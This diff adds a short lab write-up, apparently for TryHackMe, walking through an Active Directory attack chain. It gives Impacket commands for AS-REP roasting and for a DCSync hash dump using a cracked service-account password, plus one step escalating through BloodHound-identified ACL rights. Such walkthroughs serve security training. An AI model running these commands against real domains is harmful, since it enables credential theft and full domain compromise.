@@ -1,0 +1,43 @@
+---
+title: "Active Directory Attack Chain: AS-REP Roasting to DCSync"
+description: "Full attack path from unauthenticated AS-REP roasting to BloodHound ACL traversal and DCSync domain compromise."
+date: 2026-07-20
+platform: "Active Directory"
+difficulty: "Hard"
+category: "Active Directory"
+tags: ["Kerberos", "AS-REP Roasting", "BloodHound", "DCSync"]
+cover: "/media/writeups/tryhackme-ad-enterprise-chain/banner.png"
+coverAlt: "Active Directory attack chain banner"
+featured: true
+objectives:
+  - "Request TGT hashes via GetNPUsers.py."
+  - "Crack hashes using Hashcat mode 18200."
+  - "Execute DCSync via secretsdump.py."
+prerequisites:
+  - "Kerberos Authentication Protocols"
+  - "Impacket Framework"
+tools: ["Impacket", "BloodHound", "Hashcat", "Evil-WinRM"]
+---
+
+## Overview
+
+Active Directory misconfigurations allow rapid lateral movement. This walkthrough covers kerberos roasting and ACL exploitation.
+
+### Key Exploitation Steps
+
+<Steps>
+
+1. **AS-REP Roasting**:
+   ```bash
+   GetNPUsers.py CORP.LOCAL/ -no-pass -usersfile users.txt -dc-ip 10.10.120.5
+   ```
+
+2. **Privilege Escalation via BloodHound**:
+   Compromised account possessed GenericAll rights over `svc_sql`, which held DCSync permissions.
+
+3. **DCSync Domain Takeover**:
+   ```bash
+   secretsdump.py CORP.LOCAL/svc_sql:'Pass123!'@10.10.120.5 -just-dc-ntlm
+   ```
+
+</Steps>
